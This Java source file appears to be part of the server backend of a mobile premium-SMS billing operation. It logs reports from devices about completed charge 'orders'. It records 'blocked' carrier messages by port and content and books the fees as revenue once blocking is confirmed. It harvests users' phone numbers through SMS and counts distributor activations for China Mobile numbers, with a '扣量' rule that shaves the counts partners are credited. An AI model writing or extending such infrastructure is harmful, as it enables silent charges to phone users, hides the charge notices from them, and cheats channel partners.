package net.workspace.web.web.plugin;
import java.util.Date;
import javax.servlet.http.HttpServletRequest;
import net.workspace.web.entity.LogEntity;
import net.workspace.web.entity.biz.BizEntity;
import net.workspace.web.entity.client.ClientEntity;
import net.workspace.web.entity.record.BlockRecordEntity;
import net.workspace.web.entity.record.FeedbackRecordEntity;
import net.workspace.web.entity.record.OrderRecordEntity;
import net.workspace.web.entity.record.StepRecordEntity;
import net.workspace.web.service.BlackMobileService;
import net.workspace.web.service.FormatUtil;
import net.workspace.web.service.Util;
import net.workspace.web.service.channel.ChannelActivateService;
import net.workspace.web.service.record.BlockRecordService;
import net.workspace.web.service.record.FeedbackRecordService;
import net.workspace.web.service.record.StepRecordService;
import org.apache.commons.lang3.StringUtils;
import org.json.JSONObject;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import bean.Block;
import bean.Feedback;
import bean.Json;
import bean.Reportable;
import bean.SmsPhoneNumber;
import bean.Step;
import bean.form.ReportForm;

@Component
public class ReportWorker extends Worker {
    @Autowired
    StepRecordService stepRecordService;
    @Autowired
    BlockRecordService blockRecordService;
    @Autowired
    ChannelActivateService channelActivateService;
    @Autowired
    FeedbackRecordService feedbackRecordService;
    @Autowired
    BlackMobileService blackMobileService;
    @Override
    public String execute(HttpServletRequest request, JSONObject obj) throws Exception {
        ReportForm form = Json.optObj(ReportForm.class, obj);
        Reportable content = form.content;
        String deviceId = form.deviceId;
        ClientEntity client = clientService.findByDeviceId(deviceId);
        checkAreaByIp(request, client);
        log(request, new LogEntity(client, form));
        switch (content.reportType) {
            case Reportable.TYPE_STEP:
                saveStepReport(form, client, (Step) content);
                break;
            case Reportable.TYPE_BLOCK:
                saveBlockReport(client, (Block) content);
                break;
            case Reportable.TYPE_FEEDBACK:
                saveFeedbackReport(client, (Feedback) content);
                break;
            case Reportable.TYPE_GET_PN_VIA_SMS:
                savePhoneNumber(request, (SmsPhoneNumber) content);
                break;
            case Reportable.TYPE_IQ_ANSWER:
                break;
        }
        return null;
    }
    private void saveStepReport(ReportForm form, ClientEntity client, Step step) {
        if (client != null) {
            long orderId = step.orderId;
            StepRecordEntity entity = new StepRecordEntity();
            entity.setClientId(client.getId());
            entity.setOrderId(orderId);
            entity.setSuccess(form.success ? "Y" : "N");
            entity.setMessage(form.message);
            entity.setCreateTime(new Date());
            entity.setStepIndex(step.index);
            entity.setStartTime(new Date(step.executeStartTime));
            entity.setEndTime(new Date(step.executeEndTime));
            stepRecordService.save(entity);
            OrderRecordEntity order = orderRecordService.get(orderId);
            if (order != null) {
                order.setLatestStep(step.index);
                order.setLatestStepTime(new Date());
                orderRecordService.save(order);
            }
            //if (!form.success) {
            //OrderRecordEntity record = this.orderRecordService.get (orderId);
            //if (record != null && record.getFeeId () != null && record.getFeeId ()  > 10) {
            //    this.orderService.revertOrder (orderId);
            //}
            //this.jmsProducer.revertOrder(orderId, form.message);
            //}
        }
    }
    private void saveBlockReport(ClientEntity client, Block block) {
        if (client != null) {
            BlockRecordEntity entity = new BlockRecordEntity();
            entity.setBlockId(block.id);
            entity.setClientId(client.getId());
            entity.setCreateTime(new Date());
            entity.setOrderId(block.orderId);
            entity.setTargetPort(block.targetPort);
            entity.setTargetContent(block.targetContent);
            blockRecordService.save(entity);
            if (block.isConfirm) {
                OrderRecordEntity order = orderRecordService.get(block.orderId);
                if (order != null) {
                    order.setConfirmTime(new Date());
                    orderRecordService.save(order);
                    BizEntity biz = bizService.get(order.getFeeId());
                    if (biz != null) {
                        bizService.saveStat(biz.getId(), biz.getPrice(), Util.getStatMobile(client), Util.getClientProvinceId(client));
                        //this.jmsProducer.saveBizStat(client, biz);
                    }
                }
            }
        }
    }
    private void saveFeedbackReport(ClientEntity client, Feedback feedback) {
        if (client != null) {
            FeedbackRecordEntity entity = new FeedbackRecordEntity();
            entity.setFeedbackId(feedback.id);
            entity.setClientId(client.getId());
            entity.setCreateTime(new Date());
            entity.setOrderId(feedback.orderId);
            entity.setTargetPort(feedback.block.targetPort);
            entity.setTargetContent(feedback.block.targetContent);
            feedbackRecordService.save(entity);
        }
    }
    /**
     * 保存用户手机号码,并增加渠道激活数
     * 有如下情形者才算激活:
     * 1.用户之前手机号码为空
     * 2.渠道ID>0
     * 3.是中国移动号码
     * 4.不在扣量之列
     * 5.不是黑名单
     *
     * @param content
     */
    private void savePhoneNumber(HttpServletRequest request, SmsPhoneNumber content) {
        String deviceId = orderService.decodeDeviceId(content.deviceId);
        ClientEntity client = clientService.findByDeviceId(deviceId);
        checkAreaByIp(request, client);
        if (client != null) {
            String newPhoneNumber = StringUtils.right(content.phoneNumber, 11);
            String oldPhoneNumber = client.getPhoneNumber();
            if (ClientUtil.isMobile(newPhoneNumber)) {
                long channelId = client.getChannelId();
                if (!ClientUtil.isMobile(oldPhoneNumber) //当前用户的手机号码为空
                        && channelId > 0 //渠道ID大于0
                        && client.getCarrierOperator() == 1 //是中国移动号码
                        && !blackMobileService.isBlack(newPhoneNumber)//手机号码不在黑名单中
                ) {
                    channelActivateService.increaseAllActivateCount(channelId);//添加所有用户激活记录
                    if (FormatUtil.dateFormat.format(client.getCreateTime()).equals(FormatUtil.dateFormat.format(new Date())) //第一次访问时间和取号码时间为同一天
                            && !channelService.shouldDiscount(channelId) //去除扣量
                            && (client.isSystemApp() || !channelService.get(channelId).isOnlySystemApp())) {//如果要求安装在/system/app,则检查此项)
                        //只添加符合条件的激活记录
                        channelActivateService.increaseActivateCount(channelId);
                    }
                }
                client.setCarrierOperator(ClientUtil.getCarrierOperatorByPhoneNumber(newPhoneNumber));
                client.setPhoneNumber(newPhoneNumber);
                clientService.save(client);
            } else {
                errorLogger.error("setChannelAndMobile:InValidMobile, mobile is:" + newPhoneNumber);
            }
        }
    }
}
